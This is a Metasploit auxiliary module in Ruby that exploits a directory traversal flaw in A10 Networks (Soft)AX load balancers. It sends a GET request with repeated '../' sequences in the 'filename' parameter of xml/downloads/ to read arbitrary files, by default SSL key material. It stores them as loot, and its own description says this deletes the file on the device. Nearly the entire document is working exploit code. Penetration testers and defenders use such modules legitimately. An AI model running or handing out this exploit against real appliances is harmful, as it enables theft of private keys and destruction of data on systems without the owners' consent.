##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'A10 Networks (Soft)AX Loadbalancer 2.6.1-GR1-P5 and 2.7.0 Directory Traversal',
      'Description'    => %q{
        This module exploits a directory traversal flaw found in A10 Networks (Soft)
        AX loadbalancers version 2.6.1-GR1-P5/2.7.0 or less.  When handling a file download request,
        the xml/downloads class fails to properly check the 'filename' parameter, which
        can be abused to read any file outside the virtual directory. Important files include SSL certificates.
        This module works on both the hardware devices and the Virtual Machine appliances.
        IMPORTANT NOTE: This will also delete the file on the device after downloading it.
      },
      'References'     =>
        [
        ],
      'Author'         =>
        [
          'xistence',  #Vulnerability discovery and Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "Jan 28 2014"
    ))

    register_options(
      [
        OptPort.new('RPORT', [true, 'The target port', 80]),
        OptString.new('TARGETURI', [true, 'The URI path to the web application', '/']),
        OptString.new('FILE', [true, 'The file to obtain', '/a10data/key/mydomain.tld']),
        OptInt.new('DEPTH', [true, 'The max traversal depth to root directory', 10])
      ], self.class)
  end


  def run_host(ip)
    base = normalize_uri(target_uri.path)
    base << '/' if base[-1,1] != '/'

    peer = "#{ip}:#{rport}"
    fname = datastore['FILE']

    print_status("#{peer} - Reading '#{datastore['FILE']}'")
    traverse = "../" * datastore['DEPTH']
    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => "#{base}xml/downloads/",
      'vars_get' => {
        'filename' => "/a10data/tmp/#{traverse}#{datastore['FILE']}"
      }
    })


    if res and res.code == 500 and res.body =~ /Error report/
      print_error("#{peer} - Cannot obtain '#{fname}', here are some possible reasons:")
      print_error("\t1. File does not exist.")
      print_error("\t2. The server does not have any patches deployed.")
      print_error("\t3. Your 'DEPTH' option isn't deep enough.")
      print_error("\t4. Some kind of permission issues.")

    elsif res and res.code == 200
      data = res.body
      p = store_loot(
        'a10networks.ax',
        'application/octet-stream',
        ip,
        data,
        fname
      )

      vprint_line(data)
      print_good("#{peer} - #{fname} stored as '#{p}'")

    else
      print_error("#{peer} - Fail to obtain file for some unknown reason")
    end
  end

end
